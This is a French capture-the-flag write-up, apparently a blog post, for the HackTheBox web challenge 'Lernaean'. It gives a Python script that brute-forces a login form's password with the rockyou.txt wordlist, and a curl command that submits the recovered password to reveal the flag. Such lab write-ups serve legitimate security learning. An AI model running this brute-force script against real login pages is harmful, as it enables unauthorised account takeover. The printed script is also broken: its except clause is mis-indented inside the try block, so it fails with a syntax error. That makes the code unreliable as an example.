@@ -1,0 +1,117 @@
+---
+title: 'HackTheBox - [WEB] Lernaean'
+summary: "Je viens de créer mon compte sur HackTheBox, alors commençons avec un challenge web, celui appelé Lernaean.
+Ce challenge ne vaut que 20 points, donc ça devrait être facile..."
+---
+
+Je viens de créer mon compte sur HackTheBox, alors commençons avec un challenge web, celui appelé Lernaean.
+Ce challenge ne vaut que 20 points, donc ça devrait être facile...
+
+La seule description que nous avons avant de démarrer l'instance du challenge est :
+
+> "Votre cible n'est pas très douée avec les ordinateurs. Essayez de deviner son mot de passe pour voir s'il cache quelque chose !"
+
+Après avoir démarré l'instance, nous avons cette page web :
+
+![page web](/blog/hackthebox-web-lernaean/webpage.png)
+
+Le code source de la page ne contient rien d'intéressant,
+et avec la description du challenge, il n'est pas difficile de comprendre que le but de ce challenge est de
+**Brute Forcer** le mot de passe administrateur.
+
+D'abord, voyons ce qui se passe avec BurpSuite quand nous essayons de nous connecter avec le mot de passe "Hello" :
+
+![burpsuite](/blog/hackthebox-web-lernaean/burp.png)
+
+Nous pouvons voir qu'une requête POST avec les données "password=hello" est envoyée à la page web du challenge.
+
+Et quand le mot de passe est incorrect, ce texte apparaît dans le coin supérieur gauche de la page web :
+
+![message d'erreur invalide](/blog/hackthebox-web-lernaean/invalid.png)
+
+Maintenant que nous connaissons ces informations, construisons un script Python pour brute forcer le champ mot de passe.
+J'utilise **urllib**, c'est une bibliothèque Python3 qui permet de faire des requêtes très facilement.
+
+```python
+#!/usr/bin/python
+import os,sys,json
+from urllib import request, parse
+
+target = "http://docker.hackthebox.eu:30814/"
+
+print ("Chargement de la liste de mots de passe...\n")
+
+# Lire et découper le fichier de mots de passe
+passfile = open('/root/Downloads/rockyou.txt', 'r', errors='surrogateescape')
+passwords = passfile.read().split('\n')
+passfile.close()
+
+print ("Début de l'attaque sur la cible: %s" %target)
+
+# Démarrer le brute force
+for password in passwords:
+    print ("Essai de %s" %password)
+    payload = {'password':password}
+    payload = parse.urlencode(payload).encode('ascii')
+
+    req = request.Request(target, data=payload)
+    try:
+        response = request.urlopen(req, data=payload)
+        html = response.read()
+        check = "Invalid password!"
+        check = check.encode('utf-8')
+
+        if check not in html:
+            print ("Mot de passe trouvé: %s" %password)
+            pas = open('done.txt', 'a')
+            pas.write('%s' %password)
+            pas.close()
+        except request.HTTPError as e:
+            print (e.code)
+            continue
+```
+
+<em>
+  Note : J'ai utilisé le paramètre errors dans open() pour éviter une erreur d'encodage
+  que j'ai rencontrée. Idem pour l'encodage en utf-8 de la chaîne de vérification.
+</em>
+
+Dans la première partie du script, nous chargeons le fichier de mots de passe.
+J'utilise le fichier de mots de passe **rockyou.txt** que vous pouvez trouver [ici](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=2ahUKEwilp7-59OzlAhXR8uAKHfBvCncQFjAAegQIABAB&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd).
+
+Dans la deuxième partie du script, pour chaque mot de passe dans notre fichier, nous envoyons une requête POST avec les données **"password=notremotdepasse"**.
+Ensuite, nous vérifions si le HTML de la réponse contient la chaîne **"Invalid password!"**,
+si ce n'est pas le cas, cela signifie que nous avons trouvé le bon mot de passe.
+
+Après avoir créé le script, n'oubliez pas d'ajouter les droits d'exécution :
+
+```shell
+chmod +x lernaean.py
+```
+
+Et lançons-le avec python3 :
+
+```shell
+python3 lernaean.py
+```
+
+![résultat du terminal](/blog/hackthebox-web-lernaean/script.png)
+
+Quand le script trouve le bon mot de passe, il l'écrit dans le fichier **done.txt**.
+
+OUI ! Nous avons enfin le mot de passe, essayons-le sur la page web :
+
+![message trop lent](/blog/hackthebox-web-lernaean/slow.png)
+
+C'est quoi cette sorcellerie ? Nous avons le bon mot de passe mais la page web nous dit que nous sommes trop lents.
+Ok, alors envoyons le mot de passe avec curl et voyons ce qui se passe :
+
+```shell
+curl docker.hackthebox.eu:30814 -d "password=leonardo" -v
+```
+
+N'oubliez pas l'option **verbose** (-v) de la commande pour voir la réponse du serveur en détail.
+
+![résultat final du terminal](/blog/hackthebox-web-lernaean/bingo-1.png)
+
+BINGO ! Nous avons le flag dans la réponse, entre les balises HTML \<h1\> !
